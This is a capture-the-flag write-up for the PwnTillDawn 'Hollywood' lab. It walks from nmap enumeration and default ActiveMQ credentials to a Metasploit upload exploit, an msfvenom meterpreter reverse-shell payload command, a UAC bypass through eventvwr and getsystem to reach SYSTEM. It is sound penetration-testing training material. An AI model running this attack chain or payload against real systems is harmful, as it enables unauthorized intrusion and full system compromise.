---
title: Hollywood Writeup PwnTillDawn
author: r0b0tG4nG
date: 2021-11-27 01:33:00 +0000
categories: [Blogging, PwnTillDawn]
tags: [writeups, tomcat, activemq, msfconsole]
math: true
mermaid: true
---

(image info)

**> Information Gathering**<br>
The Default nmap scan showed many active ports on the target. We can see some major ports like `21 (ftp), 25 (smtp), 80 (http), 110 (pop3) 445 (smb), 8080 (tomcat) & 8161 (activemq)`. <br>

`xampp` was found running on the default port 80, directory bruteforcing this page did not yield any results.<br>
(80 image)<br> 

Apache tomcat was setup on port 8080 with `host-manager` login disallowed and the default tomcat credentials did not work on `manager app`. <br>
(8080 image)<br>

Digging deeper on port 8161, we found apache activemq running.<br>
(activemq image)<br>

The first thing i always do is to try the default login creds on webapps. I tried to login with the default username and password `admin:admin` on activemq just like we did on tomcat.<br>
(login  image)<br>

Luckily for us, the default `admin:admin` worked and we logged in succesfully.<br>
(activemq dashboard)<br>

On the admin dashboard, the version of activemq rnning on the taret is `5.11.1`. We performed a quick google to find any know exploit.<br>
(google image)<br>

We found a approved exploit from <a href="https://www.rapid7.com/db/modules/exploit/windows/http/apache_activemq_traversal_upload/">rapid7</a>. <br>
(image exploit)<br>

Load this module into `msfconsole`, setup the required module options for this exploit. `RHOST`, `RPORT`, `USERNAME`, `PASSWORD` & `LHOST`. Without these module options setup, the exploit will fail to execute.<br>
(image msf)<br>

All module options set?? then launch an attack using either `run` or `exploit` command in `msfconsole`. If successful, we should spawn a shell on the target.<br>
(shell) <br>

**> Post Exploitation**<br>

Winpeas and other tools did not provide me with any good information. So i decided to create a staged payload using `msfvenom`. To create a payload, use this `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.66.66.78 LPORT=4444 -f exe -o test.exe`<br>
(msfvenom image)

Then transfered this to the target, setup another msfconsole listerner then executed the `test.exe` on the target.<br>
(msfconsole listerner)<br>

We should have another session in the new `msfconsole` listerner. Lets background this session using the command `bg` or `background`. Load `msfconsole` post exploitation module by typing `use post/multi/recon/local_exploot_suggester`. Once the the module is loaded, set the session to your current session using `set session (session number)` and type run.<br>
(post exploit)<br>

After waiting for sometime for the results of the post module, we realized we could bypass `User Account Control` to become `NT AUTHORITY\SYSTEM`. To do this, we need to load the module `exploit/windows/local/bypassuac_eventvwr`, set `session` and `lhost` then execute the exploit again using either `run` or `exploit`.<br>
(exploit bypass)<br>

This module will bypass` Windows UAC` by hijacking a special key in the `Registry` under the current user hive, and inserting a custom command that will get invoked when the `Windows Event Viewer` is launched. We have successfuly hijacked `C:\Windows\System32\eventvwr.exe` on the target But we are still not administrator. So we will use the `getsystem` command. This comand will use a number of different techniques in attempt to gain SYSTEM level privileges on the target<br>
(get system)<br>

The technique worked and we are `NT AUTHORITY\SYSTEM` though the `Named Pipe Impersonation` technique. We have fully compromised this target.<br>
(shell img)<br>


Referrence: <a href="https://online.pwntilldawn.com/">PwnTillDawn Online battlefield</a>